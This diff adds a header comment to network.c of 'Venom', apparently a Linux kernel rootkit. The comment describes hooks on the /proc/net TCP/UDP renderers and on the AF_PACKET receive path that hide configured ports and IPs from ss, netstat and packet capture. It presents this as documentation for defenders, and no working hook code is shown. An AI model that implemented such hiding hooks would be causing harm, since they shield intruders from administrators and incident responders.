@@ -1,3 +1,37 @@
+/* 
+ * Venom 
+ * ----------------------------------------------------------------------------
+ * File: network.c
+ *
+ * Purpose (high level / non-operational):
+ *  - This file documents, at a conceptual level, the network-related touchpoints
+ *    that the Venom research project observes and the high-level observable
+ *    behaviours produced by those interventions. It is written for defenders,
+ *    incident responders, and researchers who need to understand what kernel-
+ *    level interference with network visibility looks like from the host side.
+ *
+ * Summary of behaviours implemented / documented here
+ *  - Intercepts `/proc` renderers for TCP/UDP (IPv4 & IPv6) so particular
+ *    socket entries can be filtered from userland listings.
+ *  - Observes/filters raw packet receive paths (AF_PACKET/TPACKET) so packets
+ *    matching configured criteria may not be delivered to local packet-capture
+ *    tools or may be dropped before reaching userland consumers.
+ *  - Provides a small configuration surface (hidden ports & IPs) which this
+ *    documentation uses as examples to demonstrate observable impact.
+ *
+ * Hooked kernel touchpoints (conceptual list)
+ *  - seq_file show functions for /proc/net/tcp, /proc/net/tcp6,
+ *    /proc/net/udp, /proc/net/udp6 (these are the renderers used by many
+ *    socket-listing tools). Filtering here affects what tools like `ss`,
+ *    `netstat`, and `/proc`-based readers display.
+ *  - Packet receive callback (tpacket_rcv / AF_PACKET receive path). Changes
+ *    here affect what raw packet capture APIs/clients on the host observe.
+ * 
+ * Author: Trevohack 
+*/ 
+
+
+
 #ifndef NETWORK_H
 #define NETWORK_H
 
@@ -181,3 +215,4 @@ out:
 }
 
 #endif 
+
